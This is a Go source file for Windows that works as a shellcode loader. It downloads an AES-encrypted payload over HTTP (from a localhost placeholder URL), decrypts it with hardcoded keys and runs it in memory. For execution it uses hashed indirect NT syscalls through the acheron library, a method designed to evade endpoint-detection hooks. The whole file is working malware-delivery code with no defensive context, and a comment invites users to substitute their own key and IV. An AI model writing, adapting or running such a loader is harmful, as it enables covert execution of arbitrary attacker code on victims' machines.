package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"encoding/hex"
	"fmt"
	"io"
	"net/http"
	"syscall"
	"unsafe"

	"github.com/f1zm0/acheron"
)

func fetchShellcode(url string) ([]byte, error) {
	resp, err := http.Get(url)
	if err != nil {
		return nil, fmt.Errorf("failed to fetch shellcode: %v", err)
	}
	defer resp.Body.Close()

	buf := new(bytes.Buffer)
	if _, err := io.Copy(buf, resp.Body); err != nil {
		return nil, fmt.Errorf("failed to read shellcode: %v", err)
	}

	return buf.Bytes(), nil
}

func executeShellcode(ach *acheron.Acheron, shellcode []byte) error {
	// Current process handle
	hProcess := uintptr(0xffffffffffffffff)

	// Allocate memory
	var baseAddress uintptr
	regionSize := uintptr(len(shellcode))
	s1 := ach.HashString("NtAllocateVirtualMemory")
	status, err := ach.Syscall(
		s1,
		hProcess,
		uintptr(unsafe.Pointer(&baseAddress)),
		0,
		uintptr(unsafe.Pointer(&regionSize)),
		0x3000, // MEM_COMMIT | MEM_RESERVE
		0x40,   // PAGE_EXECUTE_READWRITE (for writing and execution)
	)
	if err != nil || status != 0 {
		return fmt.Errorf("NtAllocateVirtualMemory failed: 0x%x", status)
	}

	// Write shellcode to allocated memory
	s2 := ach.HashString("NtWriteVirtualMemory")
	var bytesWritten uintptr
	status, err = ach.Syscall(
		s2,
		hProcess,
		baseAddress,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
		uintptr(unsafe.Pointer(&bytesWritten)),
	)
	if err != nil || status != 0 || bytesWritten != uintptr(len(shellcode)) {
		return fmt.Errorf("NtWriteVirtualMemory failed: 0x%x", status)
	}

	// Protect memory as executable
	s3 := ach.HashString("NtProtectVirtualMemory")
	oldProtect := uintptr(0)
	status, err = ach.Syscall(
		s3,
		hProcess,
		uintptr(unsafe.Pointer(&baseAddress)),
		uintptr(unsafe.Pointer(&regionSize)),
		0x20, // PAGE_EXECUTE_READ
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	if err != nil || status != 0 {
		return fmt.Errorf("NtProtectVirtualMemory failed: 0x%x", status)
	}

	// Create a thread to execute the shellcode
	s4 := ach.HashString("NtCreateThreadEx")
	var hThread uintptr
	status, err = ach.Syscall(
		s4,
		uintptr(unsafe.Pointer(&hThread)),
		0x1FFFFF, // THREAD_ALL_ACCESS
		0,
		hProcess,
		baseAddress,
		0,
		0,
		0,
		0,
		0,
		0,
	)
	if err != nil || status != 0 {
		return fmt.Errorf("NtCreateThreadEx failed: 0x%x", status)
	}

	// Wait for the thread to finish execution
	_, err = syscall.WaitForSingleObject(syscall.Handle(hThread), syscall.INFINITE)
	if err != nil {
		return fmt.Errorf("WaitForSingleObject failed: %v", err)
	}

	return nil
}

func decryptShellcode(encrypted []byte, key []byte, iv []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, fmt.Errorf("failed to create cipher: %v", err)
	}

	if len(encrypted)%aes.BlockSize != 0 {
		return nil, fmt.Errorf("ciphertext is not a multiple of the block size")
	}

	mode := cipher.NewCBCDecrypter(block, iv)
	decrypted := make([]byte, len(encrypted))
	mode.CryptBlocks(decrypted, encrypted)

	// Remove padding
	padding := int(decrypted[len(decrypted)-1])
	if padding > aes.BlockSize || padding <= 0 {
		return nil, fmt.Errorf("invalid padding size")
	}
	for _, p := range decrypted[len(decrypted)-padding:] {
		if int(p) != padding {
			return nil, fmt.Errorf("invalid padding")
		}
	}
	return decrypted[:len(decrypted)-padding], nil
}

// Replace these with your actual AES key and IV (in hex format)
const (
	aesKeyHex = "45664b5bdc8078110609d4e2d031e8c0b3afc4ac5b33b5e11523a615c50bceee" // 32 bytes (AES-256)
	aesIVHex  = "3d4fa4fbe360316a5ee8eeba3bd451a7"                                 // 16 bytes (AES CBC)
)

func main() {
	// Create Acheron instance
	ach, err := acheron.New()
	if err != nil {
		fmt.Printf("Error initializing Acheron: %v\n", err)
		return
	}

	url := "http://127.0.0.1/shellcode.bin.encrypted"

	encryptedShellcode, err := fetchShellcode(url)
	if err != nil {
		fmt.Printf("Error fetching shellcode: %v\n", err)
		return
	}

	fmt.Printf("Encrypted shellcode fetched successfully, size: %d bytes\n", len(encryptedShellcode))

	key, err := hex.DecodeString(aesKeyHex)
	if err != nil {
		fmt.Printf("Error decoding AES key: %v\n", err)
		return
	}

	iv, err := hex.DecodeString(aesIVHex)
	if err != nil {
		fmt.Printf("Error decoding AES IV: %v\n", err)
		return
	}

	shellcode, err := decryptShellcode(encryptedShellcode, key, iv)
	if err != nil {
		fmt.Printf("Error decrypting shellcode: %v\n", err)
		return
	}

	fmt.Printf("Shellcode decrypted successfully, size: %d bytes\n", len(shellcode))

	if err := executeShellcode(ach, shellcode); err != nil {
		fmt.Printf("Error executing shellcode: %v\n", err)
		return
	}

	fmt.Println("Shellcode executed successfully.")
}
